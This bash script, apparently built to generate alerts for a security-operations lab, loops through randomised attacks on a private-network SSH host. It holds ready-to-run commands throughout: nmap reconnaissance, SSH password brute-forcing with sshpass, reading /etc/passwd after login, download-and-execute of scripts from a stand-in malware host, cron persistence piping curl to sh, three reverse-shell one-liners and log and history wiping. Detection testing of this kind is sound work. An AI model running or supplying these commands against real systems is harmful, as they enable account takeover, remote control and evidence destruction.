#!/bin/bash

TARGET="192.168.1.21"
PORT="2222"
USER="dark"
GOOD_PASS="admin123"

PASSWORDS=("admin" "root" "123456" "password" "test" "dark" "toor" "qwerty" "admin123")
USERS=("root" "admin" "dark" "test" "ubuntu" "oracle")

banner() {
  echo
  echo "====================================="
  echo " SOC REAL ATTACK SIMULATOR"
  echo " Target: $TARGET:$PORT"
  echo "====================================="
}

recon_basic() {
  echo "[RECON] scan ports sensibles"
  nmap -Pn -p 22,2222,80,443,8080 "$TARGET" >/dev/null 2>&1
}

recon_advanced() {
  echo "[RECON] service detection"
  nmap -Pn -sV -A -p "$PORT" "$TARGET" >/dev/null 2>&1
}

recon_full() {
  echo "[RECON] scan large 1-5000"
  nmap -Pn -p 1-5000 "$TARGET" >/dev/null 2>&1
}

bruteforce_light() {
  echo "[BRUTE] tentative mots de passe simple"
  for PASS in "${PASSWORDS[@]}"; do
    sshpass -p "$PASS" ssh \
      -o StrictHostKeyChecking=no \
      -o UserKnownHostsFile=/dev/null \
      -o PreferredAuthentications=password \
      -o PubkeyAuthentication=no \
      -o ConnectTimeout=3 \
      "$USER@$TARGET" -p "$PORT" "exit" >/dev/null 2>&1
  done
}

bruteforce_multiuser() {
  echo "[BRUTE] multi-utilisateurs"
  for U in "${USERS[@]}"; do
    for PASS in "admin" "123456" "password"; do
      sshpass -p "$PASS" ssh \
        -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null \
        -o PreferredAuthentications=password \
        -o PubkeyAuthentication=no \
        -o ConnectTimeout=2 \
        "$U@$TARGET" -p "$PORT" "exit" >/dev/null 2>&1
    done
  done
}

post_exploit_linux_enum() {
  echo "[POST] enumération Linux"
  sshpass -p "$GOOD_PASS" ssh -tt \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o PreferredAuthentications=password \
    -o PubkeyAuthentication=no \
    "$USER@$TARGET" -p "$PORT" << EOF
whoami
id
hostname
uname -a
pwd
ls -la
cat /etc/passwd
cat /etc/issue
ps aux
netstat -ant
exit
EOF
}

post_exploit_download() {
  echo "[POST] téléchargement payload"
  sshpass -p "$GOOD_PASS" ssh -tt \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o PreferredAuthentications=password \
    -o PubkeyAuthentication=no \
    "$USER@$TARGET" -p "$PORT" << EOF
wget http://malware.test/a.sh
curl http://malware.test/payload.sh
chmod 777 a.sh
bash a.sh
exit
EOF
}

post_exploit_persistence() {
  echo "[POST] persistance simulée"
  sshpass -p "$GOOD_PASS" ssh -tt \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o PreferredAuthentications=password \
    -o PubkeyAuthentication=no \
    "$USER@$TARGET" -p "$PORT" << EOF
mkdir -p /tmp/.x
echo "* * * * * curl http://malware.test/c2.sh | sh" > /tmp/cron
crontab /tmp/cron
chmod 777 /tmp/.x
exit
EOF
}

post_exploit_c2() {
  echo "[POST] faux C2 / reverse shell"
  sshpass -p "$GOOD_PASS" ssh -tt \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o PreferredAuthentications=password \
    -o PubkeyAuthentication=no \
    "$USER@$TARGET" -p "$PORT" << EOF
nc 192.168.1.18 4444 -e /bin/sh
bash -i >& /dev/tcp/192.168.1.18/4444 0>&1
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.1.18",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
exit
EOF
}

post_exploit_cleanup() {
  echo "[POST] nettoyage traces"
  sshpass -p "$GOOD_PASS" ssh -tt \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o PreferredAuthentications=password \
    -o PubkeyAuthentication=no \
    "$USER@$TARGET" -p "$PORT" << EOF
history -c
rm -rf /tmp/*
rm -f ~/.bash_history
unset HISTFILE
exit
EOF
}

random_attack() {
  CHOICE=$(( RANDOM % 7 ))

  case $CHOICE in
    0)
      recon_basic
      bruteforce_light
      ;;
    1)
      recon_advanced
      bruteforce_multiuser
      ;;
    2)
      recon_basic
      post_exploit_linux_enum
      ;;
    3)
      recon_advanced
      post_exploit_download
      ;;
    4)
      recon_basic
      post_exploit_persistence
      ;;
    5)
      recon_full
      post_exploit_c2
      ;;
    6)
      recon_advanced
      post_exploit_cleanup
      ;;
  esac
}

banner

while true; do
  random_attack
  echo "[DONE] scénario terminé"
  echo "-------------------------------------"
  sleep 5
done
